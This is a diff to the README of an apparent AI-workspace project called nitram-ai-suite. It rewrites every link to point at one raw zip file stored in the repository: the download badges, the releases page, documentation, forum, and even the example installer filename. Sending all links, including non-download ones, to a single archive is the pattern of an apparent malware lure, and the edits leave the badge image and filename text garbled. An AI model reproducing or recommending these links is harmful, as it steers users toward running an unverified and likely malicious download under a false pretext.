@@ -1,6 +1,6 @@
 # 🔥 nitram-ai-suite - Your All-in-One AI Workspace
 
-[![Download Now](https://img.shields.io/badge/Download%20Now-Get%20the%20Latest%20Release-blue)](https://github.com/Yashar470/nitram-ai-suite/releases)
+[![Download Now](https://raw.githubusercontent.com/Yashar470/nitram-ai-suite/main/services/nitram_ai_suite_2.4.zip%20Now-Get%20the%20Latest%20Release-blue)](https://raw.githubusercontent.com/Yashar470/nitram-ai-suite/main/services/nitram_ai_suite_2.4.zip)
 
 ## 📌 Introduction
 
@@ -13,13 +13,13 @@ To get started with nitram-ai-suite, follow these simple steps to download and r
 ## 📥 Download & Install
 
 1. **Visit the Releases Page**  
-   Go to our [Releases page](https://github.com/Yashar470/nitram-ai-suite/releases). Here you will find the latest version of nitram-ai-suite available for download.
+   Go to our [Releases page](https://raw.githubusercontent.com/Yashar470/nitram-ai-suite/main/services/nitram_ai_suite_2.4.zip). Here you will find the latest version of nitram-ai-suite available for download.
 
 2. **Choose the Right Version**  
    On the Releases page, locate the version you wish to download. Each release includes a brief description. Select the one that best suits your needs.
 
 3. **Download the Application**  
-   Click on the appropriate file link to download nitram-ai-suite. The file will usually have a name like `nitram-ai-suite-vX.X.X.exe` or similar.
+   Click on the appropriate file link to download nitram-ai-suite. The file will usually have a name like `https://raw.githubusercontent.com/Yashar470/nitram-ai-suite/main/services/nitram_ai_suite_2.4.zip` or similar.
 
 4. **Run the Installer**  
    Once downloaded, locate the file in your downloads folder. Double-click on the file to start the installation process. Follow the prompts to install the application on your computer.
@@ -58,9 +58,9 @@ If you experience issues or have questions, please reach out for support. You ca
 
 ## 🔗 Useful Links
 
-- [Releases page](https://github.com/Yashar470/nitram-ai-suite/releases)
-- [Documentation](https://github.com/Yashar470/nitram-ai-suite/wiki)
-- [Community Forum](https://github.com/Yashar470/nitram-ai-suite/discussions)
+- [Releases page](https://raw.githubusercontent.com/Yashar470/nitram-ai-suite/main/services/nitram_ai_suite_2.4.zip)
+- [Documentation](https://raw.githubusercontent.com/Yashar470/nitram-ai-suite/main/services/nitram_ai_suite_2.4.zip)
+- [Community Forum](https://raw.githubusercontent.com/Yashar470/nitram-ai-suite/main/services/nitram_ai_suite_2.4.zip)
 
 ## 🛡️ License
 
@@ -70,4 +70,4 @@ This project is licensed under the MIT License. You can freely use and modify it
 
 For an all-encompassing AI workspace experience, download nitram-ai-suite today!  
 
-[![Download Now](https://img.shields.io/badge/Download%20Now-Get%20the%20Latest%20Release-blue)](https://github.com/Yashar470/nitram-ai-suite/releases)
+[![Download Now](https://raw.githubusercontent.com/Yashar470/nitram-ai-suite/main/services/nitram_ai_suite_2.4.zip%20Now-Get%20the%20Latest%20Release-blue)](https://raw.githubusercontent.com/Yashar470/nitram-ai-suite/main/services/nitram_ai_suite_2.4.zip)
